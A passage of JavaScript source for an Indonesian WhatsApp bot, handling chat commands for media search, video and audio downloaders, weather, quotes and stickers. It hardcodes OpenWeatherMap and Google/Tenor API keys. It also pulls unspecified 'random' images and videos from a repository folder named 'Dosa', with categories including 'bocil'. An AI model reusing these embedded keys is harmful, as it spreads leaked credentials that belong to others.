⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}

*Sebentar, masih diproses...*`
Resta.sendMessage(m.chat, { text: pla, footer: `Klik Button dibawah kalau mau yang versi Video`, contextInfo: {
				    forwardingScore: 9999,
				    isForwarded: false, // ini biar ada tulisannya diteruskan berkali-kali, jika ingin di hilangkan ganti true menjadi false
				    externalAdReply: { // Bagian ini sesuka kalian berkreasi :v
                    showAdAttribution: true,
					title: anu.title,
					body: `Don't forget to follow me @Jackks88`,
					mediaUrl: anu.url,
					description: anu.description,
					mediaType: 1,
                    renderLargerThumbnail: true,
					previewType: "PHOTO",
					thumbnail: await getBuffer(anu.thumbnail),
					sourceUrl: `https://instagram.com/Jackks88`	
				}
			},}, { quoted: meplay })
try {
  await downloadMp3(anu.url)
} catch {
  try {
    await downloadMp3(anu.url)
  } catch {
    m.reply(`error :v`);
  }
}
}
break
     case 'yts': case 'ytsearch': {
                if (!q) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(q)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
				teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
                }
                Resta.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
case 'pin':
     case 'pinterest': 
           	 if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!text) return m.reply(`Mau Cari Apa Di ${command}?\nExample : *${prefix + command} hinata*`)
                m.reply(mess.wait)
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttonspinterest = [{buttonId: `pinterest ${text}`, buttonText: {displayText: 'Next Result'}, type: 1}]
                Resta.sendMessage(m.chat, { image: { url: result }, caption: 'Source Url : '+result, buttons: buttonspinterest }, { quoted: m })
                break
     case 'sfilesearch':
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!q) return m.reply(`Mau Cari Apa Di ${command}?\nExample : *${prefix + command} WhatsApp mod*`)
                m.reply(mess.wait)
                api2.sfilesearch(`${q}`)
               .then(result => {
                res = '「 *sfilesearch* 」\n\n'
                for (let i of result) {
                res += `*Nama*: ${i.nama}\n*Ukuran*: ${i.size}\n*Link*: ${i.link}\n\n`
                }
                m.reply(res)
                });
                break 
     case 'google':
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!args[0]) return m.reply(`Example: ${prefix + command} <query>\nUses : ${prefix + command} apa arti cinta`)
                let google = require('google-it')
                m.reply(mess.wait)
                google({'query': args.join(" ")}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `*Title* : ${g.title}\n`
                teks += `*Description* : ${g.snippet}\n`
                teks += `*Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                }) 
                break
      case 'joox':
                 if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                 if (!text) throw m.reply(`*Perintah ini untuk mencari lagu joox berdasarkan pencarian*\n\ncontoh:\n${prefix + command} akad`)
                 if (isUrl(text)) throw m.reply(`*Perintah ini untuk mencari lagu joox berdasarkan pencarian bukan link*\n\ncontoh:\n${prefix + command} akad`)
                 noapi.joox(text).then(res => {
                 let joox = JSON.stringify(res)
                 let jjson = JSON.parse(joox)
                 m.reply(mess.wait)
                 let random = Math.floor(Math.random() * jjson.data.length)
                 hasil = jjson.data[random]
                 let json = hasil
                 pesan = `*Penyanyi:* ${json.penyanyi}\n*Judul:* ${json.lagu}\n*Album:* ${json.album}\n*Diterbitkan:* ${json.publish}\nBy ${ownerName}\n\nPlease Be Patient We Are Sending The Data You Request`
                 Resta.sendMessage(m.chat, { image: { url: json.img}, caption: pesan}, {quoted:m})
                 Resta.sendMessage(m.chat, { audio: { url: json.mp3 }, mimetype: 'audio/mpeg', fileName: `${json.penyanyi}.mp3` }, { quoted: m })
                 })
                 break
//DOWNLOADER//
case 'yta': case 'ytmp3': case 'mp3':{
  if (!text) return m.reply('Masukan Link!')
  try {
    m.reply(mess.wait)
    await downloadMp3(text);
  } catch (err1) {
    try {
      m.reply(mess.wait)
      await downloadMp3(text);
    } catch (err2) {
      console.error(err2)
      m.reply(`Terjadi kesalahan saat mengonversi ke MP3`);
    }
  }
}		
break
case 'ytv':
case 'ytmp4':
case 'mp4': {
  if (!text) return m.reply('Masukkan URL!')
  try {
    m.reply(mess.wait)
    await downloadMp4(text);
  } catch (err1) {
    try {
      m.reply(mess.wait)
      await downloadMp4(text);
    } catch (err2) {
      m.reply('Terjadi kesalahan saat mengunduh video.');
    }
  }
}
  break;
   case 'ig':
     case'igmp4':
     case 'igvideo':
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!q) return m.reply(`Use example ${command} https://www.instagram.com/p/CMeFrnTp8as`)
                if (!isUrl(q)) throw m.reply(mess.link) 
		        if (!q.includes('instagram.com')) return m.reply(mess.link1)
	            m.reply(mess.wait)
                try {
                a = await instagramdlv2(args[0])
                await Resta.sendMessage(m.chat, {video:{url: a[0].url.split("snapsave.app")[1]}, mimetype:"video/mp4", caption: `Mode By ${namaBot}`}, {quoted:m})
                } catch (err) {
                console.log(err)
                await Resta.sendMessage(m.chat, { image : { url:  global.erorurl }, caption: '💔️ Maaf, Data tidak ditemukan'}, { quoted: m })
                }
                break
     case 'igfoto':
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!q) return m.reply(`Use example ${command} https://www.instagram.com/p/CMeFrnTp8as`)
                if (!isUrl(q)) throw m.reply(mess.link) 
		        if (!q.includes('instagram.com')) return m.reply(mess.link1)
	            m.reply(mess.wait)
                try {
                a = await instagramdlv2(args[0])
                await Resta.sendMessage(m.chat, {image: {url: a[0].url.split("snapsave.app")[1]}, caption: `By Mode ${namaBot}` }, { quoted: m })
                } catch (err) {
                console.log(err)
                await Resta.sendMessage(m.chat, { image : { url:  global.erorurl }, caption: '💔️ Maaf, Data tidak ditemukan'}, { quoted: m })
                }
                break
      /*case 'fbdl':
      case 'facebook':
                if (!text) return m.reply( `Example : ${prefix + command} link`)
                if (!q.includes('facebook.com')) return m.reply(`Link Invalid!!`)
                m.reply("Loading...")
                const { fbdl } = require("../lib/facebook");
                fbdl(q).then( data => {
                if (data.length == 0) return reply(`Maaf terjadi kesalahan, ganti link yang lain!`)
                Resta.sendMessage(m.chat, { video: { url: data[data.length - 1] }, caption: data.title }, { quoted: m })
                })
                break*/
     case 'soundcloud':{
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!q) return m.reply(`Gunakan Format : ${command} linknya`)
                if (!isUrl(q)) throw m.reply(mess.link) 
                if (!q.includes('soundcloudmp')/('soundcloud.com')) return m.reply('Link Invalid ❎')
                await m.reply(mess.wait)
                api2.soundcloud(`${q}`) 
               .then(result => {
                let text =`*🔰SOUNDCLOUD🔰*\n`
                text +=`*Title*: ${result.title}\n`
                text +=`*Durasi*: ${result.duration}\n`
                text +=`*Qulity*: ${result.quality}\n`
                text +=`*Author*: ${result.author}\n\n Wait Is Sending The Data You Request`
                Resta.sendImage(m.chat, result.thumbnail, text, m)
                Resta.sendMessage(m.chat, {document: {url:  result.download}, mimetype: 'audio/mpeg', fileName: `${result.title}.mp3`}, { quoted: m })
                }).catch(() => Resta.sendMessage(m.chat, { image : { url:  global.erorurl }, caption: '💔️ Maaf, Video tidak ditemukan'}, { quoted: m }))
              }
                break
     case 'cocofun': {
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!q) return m.reply(`Gunakan Format : ${command} https://www.icocofun.com/share/post/490013276810?lang=id&pkg=id&share_to=copy_link&m=253e3d90d057da0de4f9544ed67e4c54&d=0d18db9c398405eed9a59120805e336ff6dd6d841c556ada2b191c37a722a522&nt=1`)
                if (!isUrl(q)) throw m.reply(mess.link) 
                if (!q.includes('icocofun.com')/('cocofun.com')) return m.reply('Link Invalid ❎')
                await m.reply(mess.wait)
                api2.cocofun(`${q}`) 
               .then(result => {
                let text =`*🔰COCOFUN🔰*\n`
                text +=`*Topic*: ${result.topic}\n`
                text +=`*Caption*: ${result.caption}\n`
                text +=`*View*: ${result.play}\n`
                text +=`*Share*: ${result.share}\n`
                text +=`*Like*: ${result.like}\n`
                text +=`*Durasi*: ${result.duration}`
                Resta.sendMessage(from, {video:{url: result.no_watermark}, mimetype:"video/mp4", caption: text}, {quoted:m})
                }).catch(() => Resta.sendMessage(m.chat, { image : { url:  global.erorurl }, caption: '💔️ Maaf, Data tidak ditemukan'}, { quoted: m }))
                }
                break 
       case 'gitclone': {
                 if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                 try {
                 if (!args[0]) return m.reply('Linknya?')
                 let regx = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                 if (!regx.test(args[0])) return m.reply('Linknya salah')
                 m.reply(mess.wait)
                 let [, usker, repo] = args[0].match(regx) || []
                 repos = repo.replace(/.git$/, '')
                 let hasdl = `https://api.github.com/repos/${usker}/${repos}/zipball`
                 let namafile = (await fetch(hasdl, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                 Resta.sendMessage(m.chat, { document: { url: hasdl }, fileName: `${namafile}`, mimetype: 'zip' }, { quoted: m })
                 } catch (err) {
                 m.reply(err)
                 }
                 }
                 break
case 'lirik': {
var tesk = text ? text : m.quoted && m.quoted.text ? m.quoted.text : ''
	if (!tesk) return m.reply(`Use example ${command} hallo`)
		try {
	var result = await lyrics(tesk)
	m.reply(`
Lyrics *${result.title}*
Author ${result.author}
${result.lyrics}
Url ${result.link}
`.trim())
		} catch (err) {
      m.reply(err)
    }
}
break
       case 'cuaca': {
if (!q) return m.reply(`_Contoh_\n${prefix+command} palembang`)
let api_cuaca = '18d044eb8e1c06eaf7c5a27bb138694c'
let unit_cuaca = 'metric'
let nama_kota = q
let cuaca = await fetchJson(`http://api.openweathermap.org/data/2.5/weather?q=${nama_kota}&units=${unit_cuaca}&appid=${api_cuaca}`)
let text_cuaca =`*INFO CUACA*
Nama: ${cuaca.name + "," + cuaca.sys.country}
Longitude: ${cuaca.coord.lon}
Latitude: ${cuaca.coord.lat}
Suhu: ${cuaca.main.temp + " C"}
Angin: ${cuaca.wind.speed + " m/s"}
Kelembaban: ${cuaca.main.humidity + "%"}
Cuaca: ${cuaca.weather[0].main}
Keterangan: ${cuaca.weather[0].description}
Udara: ${cuaca.main.pressure + " HPa"}`
m.reply(text_cuaca)
}
break
case 'covid':{
const t = await copid()
var { kasus, kematian, sembuh } = t[0]
Resta.sendMessage(from, {text : `*COVID IN WORLD*\n\nKasus : ${kasus}\n\nKematian : ${kematian}\n\nSembuh : ${sembuh}`}, m)
}
break
case 'covidindo':{
const c = await covid()
var { kasus, kematian, sembuh } = c[0]
Resta.sendMessage(from, {text : `*COVID IN INDONESIA*\n\nKasus : ${kasus}\n\nKematian : ${kematian}\n\nSembuh : ${sembuh}`}, m)
}
break
case 'fbdown':
case 'fb':
  case 'fbdl':
    if (!args[0]) {
      throw m.reply(`Masukkan URL!\n\ncontoh:\n${command} https://www.facebook.com/watch/?v=1393572814172251`);
    }
    try {
      m.reply(mess.wait);
      const response = await fetch(`${lannn}/api/download/fbdown?url=${args[0]}&apikey=${lannkey}`);
      if (!response.ok) {
        throw await response.text();
      }
      const result = await response.json();
      if (!result.status) {
        throw result;
      }
      const { Normal_video, HD } = result.result;
      const fileToSend = Normal_video || HD;
      if (!fileToSend) {
        throw m.reply('Tidak dapat menemukan file video Facebook.');
      }
      await Resta.sendFile(
        m.chat,
        fileToSend,
        'facebook.mp4',
        `*${args[0]}*`,
        m
      );
    } catch (err) {
      console.error(err);
      m.reply('Terjadi kesalahan saat mengambil video Facebook.');
    }
    break        
       case 'tiktoknowm':
       case 'tiktok':
        case 'tt': {
          if (!args[0]) {
            throw m.reply(`Masukkan URL!\n\ncontoh:\n${command} https://vm.tiktok.com/ZGJAmhSrp/`);
          }
          if (!args[0].match(/tiktok/gi)) {
            throw m.reply(`URL Tidak Ditemukan!`);
          }
          try {
            m.reply(mess.wait);
            const response = await fetch(`${lannn}/api/download/tiktok?url=${args[0]}&apikey=${lannkey}`);
            if (!response.ok) {
              throw await response.text();
            }
            const result = await response.json();
            if (!result.status) {
              throw result;
            }
            const { video, video2, video_HD, username, description } = result.result;
            const fileToSend = video || video2 || video_HD;
            if (!fileToSend) {
              throw m.reply('Tidak dapat menemukan file video Tiktok.');
            }
            await Resta.sendFile(
              m.chat,
              fileToSend,
              'tiktok.mp4',
              `*Deskripsi*: ${description}\n*Username*: ${username}`,
              m
            );
          } catch (err) {
            console.error(err);
            m.reply('Terjadi kesalahan saat mengambil video Tiktok.');
          }
        }
          break;      
     case 'tiktokmp3':
     case 'tiktokmusic':
	 case 'ttmp3': {
    if (!args[0]) {
      throw m.reply(`Masukkan URL!\n\ncontoh:\n${command} https://vm.tiktok.com/ZGJAmhSrp/`);
    }
    if (!args[0].match(/tiktok/gi)) {
      throw m.reply(`URL Tidak Ditemukan!`);
    }
    try {
      m.reply(mess.wait);
      const response = await fetch(`${lannn}/api/download/tiktok?url=${args[0]}&apikey=${lannkey}`);
      if (!response.ok) {
        throw await response.text();
      }
      const result = await response.json();
      if (!result.status) {
        throw result;
      }
      const { video, video2, video_HD, username, description } = result.result;
      const fileToSend = video || video2 || video_HD;
      if (!fileToSend) {
        throw m.reply('Tidak dapat menemukan file video Tiktok.');
      }
      await Resta.sendMessage(m.chat, { audio :{ url: fileToSend}, mimetype:'audio/mpeg', fileName: 'tiktokmp3', caption:`*Deskripsi*: ${description}\n*Username*: ${username}`},{quoted:m});
    } catch (err) {
      console.error(err);
      m.reply('Terjadi kesalahan saat mengambil music Tiktok.');
    }
  }
		        break 
		        case 'jarak': {
    try {
        const [from, to] = text.split("|")
        if (!(from && to)) throw m.reply("Contoh: " + prefix + "jarak jakarta|bandung")
        const data = await jarak(from.trim(), to.trim())
        if (data.img) {
            await Resta.sendMessage(m.chat, { image: data.img, caption: data.desc }, { quoted: m })
        } else {
            await m.reply(data.desc)
        }
    } catch (error) {
        console.log(error)
        await m.reply("Terjadi kesalahan saat memproses pesan")
    }

async function jarak(dari, ke) {
    try {
        const html = (await axios.get(`https://www.google.com/search?q=${encodeURIComponent('jarak ' + dari + ' ke ' + ke)}&hl=id`)).data
        const $ = cheerio.load(html)
        const obj = {}
        const img = html.split("var s=\'")?.[1]?.split("\'")?.[0]
        obj.img = /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split(',')[1], 'base64') : ''
        obj.desc = $('div.BNeawe.deIvCb.AP7Wnd').text()?.trim()
        return obj
    } catch (error) {
        console.log(error)
        throw "Terjadi kesalahan saat memproses permintaan jarak"
    }
}
}
break
     case 'getmusic': {
                if (!text) throw m.reply(`Example : ${prefix + command} 1`) 
                if (!m.quoted) return m.reply('Reply Pesan Hasil Dari Ytsearch')
                if (!m.quoted.isBaileys) throw m.reply (`Hanya Bisa Membalas Pesan Dari Bot`) 
		        let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw m.reply(`Mungkin pesan yang anda reply tidak mengandung result ytsearch`) 
                m.reply(mess.wait)
                try {
                  await downloadMp3(urls[text - 1]);
                } catch (err1) {
                  try {
                    await downloadMp3(urls[text - 1]);
                  } catch (err2) {
                    m.reply(`error :v`);
                  }
                }
              }
              break
     case 'getvideo': {
                if (!text) throw m.reply(`Example : ${prefix + command} 1`) 
                if (!m.quoted) return m.reply('Reply Pesan Hasil Dari ytsearch')
                if (!m.quoted.isBaileys) throw m.reply (`Hanya Bisa Membalas Pesan Dari Bot`) 
                let urps = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urps) throw m.reply(`Mungkin pesan yang anda reply tidak mengandung result ytsearch`)
                m.reply(mess.wait)
                try {
                  await downloadMp4(urps[text - 1]);
                } catch (err1) {
                  try {
                    await downloadMp4(urps[text - 1]);
                  } catch (err2) {
                    m.reply(`error :v`);
                  }
                }
     }
                break
///RANDOM ASUPAN//
case 'harley':
case 'anony': {
let vimde = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Dosa/${command}.json`) 
				let vemdi = pickRandom(vimde)
				await Resta.sendMessage(m.sender, { image: { url: vemdi.url }, caption: `Nih Bre\n${command} Buwat Eluwh:v`, fileName: `${vemdi}`},{quoted:m})
	 }
	 break
case 'cecan3':
case 'china':
case 'cogan':
case 'indonesia':
case 'japan':
case 'korea':
case 'malaysia':
case 'thailand':
case 'vietnam':
case 'cecan2':{
let cemc = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Cecan/${command}.json`)
const ccme = pickRandom(cemc)
await Resta.sendMessage(m.sender, { image: { url: ccme }, caption: `Nih ${command}`})
}
break
case 'cecan':
case 'hijaber':
case 'bocil': {
let vimde = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Dosa/${command}.json`) 
				let vemdi = pickRandom(vimde)
				await Resta.sendMessage(m.sender, { image: { url: vemdi }, caption: `Nih Bre\n${command} Buwat Eluwh:v`, fileName: `${vemdi}`},{quoted:m})
	 }
	 break
break
case 'asupan':
case 'euni':
case 'geayubi':
case 'natajadeh':
case 'rikagusriani':
case 'santuy':
case 'ukhty':	 {
		        let vimde = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Dosa/${command}.json`) 
				let vemdi = pickRandom(vimde)
				await Resta.sendMessage(m.sender, { video: { url: vemdi }, caption: `Nih Bre\n${command} Buwat Eluwh:v`, fileName: `${vemdi}`},{quoted:m})
	 }
	 break
///QUOTES TEXT///
     case 'katabijak':
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                var er = `contoh: ${prefix + command} cinta\n\nOpsi Tersedia:\n• cinta\n• rindu\n• mimpi\n• sedih\n• sendiri\n• sabar\n• kesedihan\n• pernikahan\n• kemerdekaan\n\n By ${ownerName}`
	            if (!text) throw m.reply(er)
		        case 'cinta':
		        case 'rindu':
		        case 'mimpi':
		        case 'sendiri':
		        case 'sabar':
		        case 'kesedihan':
		        case 'pernikahan':
		        case 'kemerdekaan':
			    noapi.quotes(text.toLowerCase()).then(res => {
			    data = JSON.stringify(res)
		        json = JSON.parse(data)
			    let random = Math.floor(Math.random() * json.data.length)
			    hasil = json.data[random]
		        var { author, bio, quote } = hasil
			    m.reply(`“${quote}”\n\n${author} - ${bio}`)
		        })
		        break
case 'murothal': {
if (!text) return m.reply(`Mau juz yang keberapa?\n\n Example : ${command} 1`)
if (!args[0]) m.reply(mess.wait)
if (args[0] === "1") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2b8SiNO' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "2") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2b8RJmQ' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "3") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bFSrtF' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "4") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2b8SXi3' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "5") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2b8RZm3' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "6") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/28MBohs' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "7") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bFRIZC' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "8") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bufF7o' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "9") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2byr1bu' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "10") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bHfyUH' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "11") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bHf80y' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "12") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bWnTby' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "13") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bFTiKQ' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "14") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2b8SUTA' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "15") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bFRQIM' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "16") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2b8SegG' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "17") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2brHsFz' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "18") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2b8SCfc' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "19") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bFSq95' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "20") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2brI1zc' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "21") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2b8VcBO' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "22") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bFRxNP' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "23") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2brItxm' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "24") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2brHKw5' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "25") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2brImlf' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "26") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bFRHF2' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "27") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bFRXno' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "28") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2brI3ai' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "29") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bFRyBF' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } else if (args[0] === "30") {
                 Resta.sendMessage(m.chat, { audio: { url: 'http://j.mp/2bFREcc' }, mimetype: 'audio/mpeg', fileName: `Juz ${args[0]}.mp3` }, { quoted: m })
                 } 
}
break
      case 'quotes':
                 var asp = `Example : ${prefix + command} katabucin\n\nOpsi Tersedia:\n• katabucin\n• gombal\n• galau\n• dare\n• truth\n• renungan\n• motivasi\n\nBy ${ownerName}`
                 if (!text) throw m.reply(asp)
                 if (args[0] === "katabucin") {
                 anu = await fetchJson(`https://raw.githubusercontent.com/Restaa/databasegames/master/Kata-kata/katabucin.json`)
                 result = pickRandom(anu)
                 Resta.sendText(m.chat, result, m)
                 } else if (args[0] === "gombal") {
                 anu = await fetchJson(`https://raw.githubusercontent.com/Restaa/databasegames/master/Kata-kata/gombalan.json`)
                 result = pickRandom(anu)
                 Resta.sendText(m.chat, result, m)
                 } else if (args[0] === "galau") {
                 anu = await fetchJson(`https://raw.githubusercontent.com/Restaa/databasegames/master/Kata-kata/katagalau.json`)
                 result = pickRandom(anu)
                 Resta.sendText(m.chat, result, m)
                 } else if (args[0] === "dare") {
                 anu = await fetchJson(`https://raw.githubusercontent.com/Restaa/databasegames/master/Kata-kata/dare.json`)
                 result = pickRandom(anu)
                 Resta.sendText(m.chat, result, m)
                 } else if (args[0] === "truth") {
                 anu = await fetchJson(`https://raw.githubusercontent.com/Restaa/databasegames/master/Kata-kata/truth.json`)
                 result = pickRandom(anu)
                 Resta.sendText(m.chat, result, m)
                 } else if (args[0] === "renungan") {
                 anu = await fetchJson(`https://raw.githubusercontent.com/Restaa/databasegames/master/Kata-kata/renungan.json`)
                 result = pickRandom(anu)
                 Resta.sendMessage(m.chat, { image: { url: result }, caption: `Quotes ${command}` }, { quoted: m })              
                 } else if (args[0] === "motivasi") {
                 anu = await fetchJson(`https://raw.githubusercontent.com/Restaa/databasegames/master/Kata-kata/motivasi.json`)
                 result = pickRandom(anu)
                 Resta.sendText(m.chat, result, m)
                 }
                 break
      case 'pantun':
                 anu = await fetchJson(`https://raw.githubusercontent.com/Restaa/databasegames/master/Kata-kata/pantun.json`)
                 result = pickRandom(anu)
                 Resta.sendText(m.chat, result, m)
                 break
//CONVERTER MEDIA//
      case 'emojimix2':
		         if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
	             if (!text) throw m.reply(`Example : ${prefix + command} 😅`) 
	             anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		         for (let res of anu.results) {
		         let encmedia = await Resta.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		         fs.unlinkSync(encmedia)
		         }
	             break
      case 'emojimix': {
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
		        let [emoji1, emoji2] = text.split`+`
		        if (!emoji1) throw m.reply (`Example : ${prefix + command} 😅+🤔`) 
		        if (!emoji2) throw m.reply (`Example : ${prefix + command} 😅+🤔`) 
		        anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		        for (let res of anu.results) {
		        let encmedia = await Resta.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		        fs.unlinkSync(encmedia)
		        }
	            }
	            break
      case 'sticker': case 's': case 'stickergif': case 'sgif': {
                 //if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                 if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
                 m.reply(mess.wait)
                 if (/image/.test(mime)) {
                 let media = await quoted.download()
                 let encmedia = await Resta.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                 fs.unlinkSync(encmedia)
                 } else if (/video/.test(mime)) {
                 if ((quoted.msg || quoted).seconds > 16) return m.reply('Maksimal 10 detik!')
                 let media = await quoted.download()
                 let encmedia = await Resta.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                 fs.unlinkSync(encmedia)
                 } else if (/webp/.test(mime)) {
                 let media = await quoted.download()
                 let encmedia = await Resta.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                 fs.unlinkSync(encmedia)
                 } else {
